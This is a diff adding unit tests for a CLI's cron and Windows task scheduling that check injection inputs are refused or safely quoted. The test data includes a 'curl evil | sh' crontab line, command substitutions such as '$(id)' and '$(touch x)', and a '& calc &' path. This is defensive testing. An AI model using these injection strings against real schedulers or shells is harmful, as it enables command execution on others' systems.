@@ -1,5 +1,6 @@
 import { describe, expect, it, vi } from 'vitest';
 import { spawnSync } from 'child_process';
+import { resolve } from 'path';
 
 vi.mock('child_process', async (importOriginal) => {
   const actual = await importOriginal<typeof import('child_process')>();
@@ -14,12 +15,14 @@ vi.mock('../../../platform/executable-resolution.js', async (importOriginal) => 
 
 import {
   buildSchedulePlan,
+  buildScheduledCommand,
   checkOrCreateHarborLabels,
   checkTrackerReachable,
   defaultIntakeRunner,
   filterCrontabLines,
   parseSimpleCron,
   runHeadlessIntake,
+  scheduleIntake,
   validateHostBin,
   type IntakeRunner,
 } from '../intake.js';
@@ -137,6 +140,103 @@ describe('buildSchedulePlan', () => {
   it('refuses unsupported expressions on Windows instead of approximating', () => {
     const plan = buildSchedulePlan('win32', '*/7 * * * *', 'omg intake run --headless');
     expect('refused' in plan).toBe(true);
+  });
+
+  it('refuses cron input that would inject crontab lines or command text', () => {
+    for (const expr of [
+      '*/30 * * * *\n* * * * * curl evil | sh',
+      '*/30 * * * * touch /tmp/pwned',
+      '*/30 * * * $(id)',
+      '0 6 * * %',
+      '0 6 * *',
+    ]) {
+      expect('refused' in buildSchedulePlan('linux', expr, 'omg intake run --headless')).toBe(true);
+      expect('refused' in buildSchedulePlan('win32', expr, 'omg intake run --headless')).toBe(true);
+    }
+    const ok = buildSchedulePlan('linux', ' 0 6 * * MON-FRI ', 'omg intake run --headless');
+    expect(ok).toMatchObject({ crontabLine: '0 6 * * MON-FRI omg intake run --headless # omc-intake' });
+  });
+
+  it('accepts the vixie-cron macros on unix only, as an exact match', () => {
+    for (const macro of ['@yearly', '@annually', '@monthly', '@weekly', '@daily', '@midnight', '@hourly']) {
+      expect(buildSchedulePlan('linux', ` ${macro} `, 'omg intake run --headless')).toEqual({
+        platform: 'cron',
+        crontabLine: `${macro} omg intake run --headless # omc-intake`,
+      });
+      expect('refused' in buildSchedulePlan('win32', macro, 'omg intake run --headless')).toBe(true);
+    }
+    for (const expr of ['@reboot', '@daily touch /tmp/pwned', '@daily\n* * * * * id', '@Daily']) {
+      expect('refused' in buildSchedulePlan('linux', expr, 'omg intake run --headless')).toBe(true);
+    }
+  });
+});
+
+describe('scheduleIntake --off', () => {
+  const realPlatform = process.platform;
+
+  function recordingRunner(calls: Array<{ cmd: string; args: string[]; input?: string }>): IntakeRunner {
+    return (cmd, args, options) => {
+      calls.push({ cmd, args, input: options.input });
+      if (cmd === 'crontab' && args[0] === '-l') {
+        return { status: 0, stdout: '0 1 * * * backup\n*/30 * * * * omg intake run # omc-intake\n', stderr: '' };
+      }
+      return { status: 0, stdout: '', stderr: '' };
+    };
+  }
+
+  it('removes the crontab entry even when the cwd and cron value would be refused', () => {
+    Object.defineProperty(process, 'platform', { value: 'linux', configurable: true });
+    try {
+      const calls: Array<{ cmd: string; args: string[]; input?: string }> = [];
+      const result = scheduleIntake({ cwd: '/tmp/100%', cron: 'not a cron', off: true }, recordingRunner(calls));
+      expect(result).toEqual({ exitCode: 0, message: 'scheduled entry removed from crontab.' });
+      expect(calls.at(-1)).toEqual({ cmd: 'crontab', args: ['-'], input: '0 1 * * * backup\n' });
+    } finally {
+      Object.defineProperty(process, 'platform', { value: realPlatform, configurable: true });
+    }
+  });
+
+  it('deletes the scheduled task on Windows without validating the cwd or cron value', () => {
+    Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
+    try {
+      const calls: Array<{ cmd: string; args: string[]; input?: string }> = [];
+      const result = scheduleIntake({ cwd: 'C:\\100%', cron: '*/7 * * * *', off: true }, recordingRunner(calls));
+      expect(result.exitCode).toBe(0);
+      expect(calls).toHaveLength(1);
+      expect(calls[0]).toMatchObject({ cmd: 'schtasks', args: ['/Delete', '/TN', expect.any(String), '/F'] });
+    } finally {
+      Object.defineProperty(process, 'platform', { value: realPlatform, configurable: true });
+    }
+  });
+});
+
+describe('buildScheduledCommand', () => {
+  it('single-quotes the cwd for sh so quotes and $() stay literal', () => {
+    const dir = resolve('/tmp/a" $(touch x) \'b');
+    const cmd = buildScheduledCommand(dir, 'linux');
+    expect(cmd).toBe(`omg intake run --headless --allow-docket-only --cwd '${dir.replace(/'/g, `'\\''`)}'`);
+    if (process.platform !== 'win32') {
+      const echoed = spawnSync('sh', ['-c', `printf %s ${cmd.slice(cmd.indexOf('--cwd ') + 6)}`], { encoding: 'utf-8' });
+      expect(echoed.stdout).toBe(dir);
+    }
+  });
+
+  it('refuses a cwd the scheduler quoting cannot carry', () => {
+    expect(() => buildScheduledCommand('/tmp/a\nb', 'linux')).toThrow(/unsupported characters/);
+    expect(() => buildScheduledCommand('/tmp/100%', 'linux')).toThrow(/unsupported characters/);
+    expect(() => buildScheduledCommand('C:\\a" & calc & "', 'win32')).toThrow(/unsupported characters/);
+    expect(buildScheduledCommand('C:\\Code\\repo', 'win32')).toMatch(/--cwd "[^"]*repo"$/);
+  });
+
+  it('doubles trailing backslashes on Windows so the closing quote is not escaped', () => {
+    for (const dir of ['C:\\', '\\\\server\\share\\']) {
+      const cmd = buildScheduledCommand(dir, 'win32');
+      const resolved = resolve(dir);
+      const trailing = /\\+$/.exec(resolved)?.[0].length ?? 0;
+      expect(trailing).toBeGreaterThan(0);
+      expect(cmd).toBe(`omg intake run --headless --allow-docket-only --cwd "${resolved}${'\\'.repeat(trailing)}"`);
+    }
+    expect(buildScheduledCommand('C:\\Code\\repo', 'win32')).not.toMatch(/\\\\"$/);
   });
 });
 
